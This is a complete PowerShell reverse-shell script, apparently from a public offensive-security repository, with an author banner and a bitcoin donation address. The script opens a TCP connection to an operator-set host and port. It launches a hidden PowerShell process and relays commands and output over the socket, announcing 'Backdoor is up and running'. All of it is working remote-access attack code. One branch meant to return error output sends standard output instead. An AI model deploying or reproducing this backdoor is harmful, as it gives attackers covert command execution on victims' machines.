Write-Host "#######################################################################";
Write-Host "#                                                                     #";
Write-Host "#                     PowerShell Reverse TCP v3.8                     #";
Write-Host "#                                       by Ivan Sincek                #";
Write-Host "#                                                                     #";
Write-Host "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp. #";
Write-Host "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #";
Write-Host "#                                                                     #";
Write-Host "#######################################################################";
$client = $stream = $buffer = $writer = $process = $stderr = $stdout = $stderrEvent = $stdoutEvent = $null;
try {
	# change the host address and/or port number as necessary
	$client = New-Object Net.Sockets.TcpClient("127.0.0.1", 9000);
	$stream = $client.GetStream();
	$stream.ReadTimeout = 5;
	$buffer = New-Object Byte[] 1024;
	$writer = New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024);
	$writer.AutoFlush = $true;
	# start process
	$process = New-Object Diagnostics.Process;
	$process.StartInfo = New-Object Diagnostics.ProcessStartInfo;
	$process.StartInfo.FileName = "powershell";
	$process.StartInfo.CreateNoWindow = $true;
	$process.StartInfo.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden;
	$process.StartInfo.UseShellExecute = $false;
	$process.StartInfo.RedirectStandardInput = $process.StartInfo.RedirectStandardError = $process.StartInfo.RedirectStandardOutput = $true;
	# suppress possible errors
	$process.StartInfo.ErrorDialog = $false;
	$process.EnableRaisingEvents = $false;
	$stderr = New-Object Text.StringBuilder;
	$stdout = New-Object Text.StringBuilder;
	$scriptBlock = {
		if ($EventArgs.Data.Length -gt 0) {
			$Event.MessageData.AppendLine($EventArgs.Data);
		}
	};
	$stderrEvent = Register-ObjectEvent -InputObject $process -EventName "ErrorDataReceived" -Action $scriptBlock -MessageData $stderr;
	$stdoutEvent = Register-ObjectEvent -InputObject $process -EventName "OutputDataReceived" -Action $scriptBlock -MessageData $stdout;
	$process.Start() | Out-Null;
	$process.BeginErrorReadLine();
	$process.BeginOutputReadLine();
	Write-Host "Backdoor is up and running...";
	Write-Host "";
	while (!$process.HasExited) {
		try {
			$bytes = $stream.Read($buffer, 0, $buffer.Length); # unblock with timeout
			if ($bytes -gt 0) {
				$process.StandardInput.Write($buffer, 0, $bytes);
			} else { break; }
		} catch [Management.Automation.MethodInvocationException] {}
		if ($stderr.Length -gt 0) {
			$writer.Write($stdout.ToString()); $stdout.clear();
		}
		if ($stdout.Length -gt 0) {
			$writer.Write($stdout.ToString()); $stdout.clear();
		}
	}
	Write-Host "Backdoor will now exit...";
} catch {
	Write-Host $_.Exception.InnerException.Message;
} finally {
	if ($stderrEvent -ne $null) {
		Unregister-Event -SourceIdentifier $stderrEvent.Name;
		Clear-Variable -Name "stderrEvent";
	}
	if ($stdoutEvent -ne $null) {
		Unregister-Event -SourceIdentifier $stdoutEvent.Name;
		Clear-Variable -Name "stdoutEvent";
	}
	if ($process -ne $null) {
		$process.Close(); $process.Dispose();
		Clear-Variable -Name "process";
	}
	if ($writer -ne $null) {
		$writer.Close(); $writer.Dispose();
		Clear-Variable -Name "writer";
	}
	if ($stream -ne $null) {
		$stream.Close(); $stream.Dispose();
		Clear-Variable -Name "stream";
	}
	if ($client -ne $null) {
		$client.Close(); $client.Dispose();
		Clear-Variable -Name "client";
	}
	if ($buffer -ne $null) {
		$buffer.Clear();
		Clear-Variable -Name "buffer";
	}
	if ($stderr -ne $null) {
		$stderr.Clear();
		Clear-Variable -Name "stderr";
	}
	if ($stdout -ne $null) {
		$stdout.Clear();
		Clear-Variable -Name "stdout";
	}
	[GC]::Collect();
}
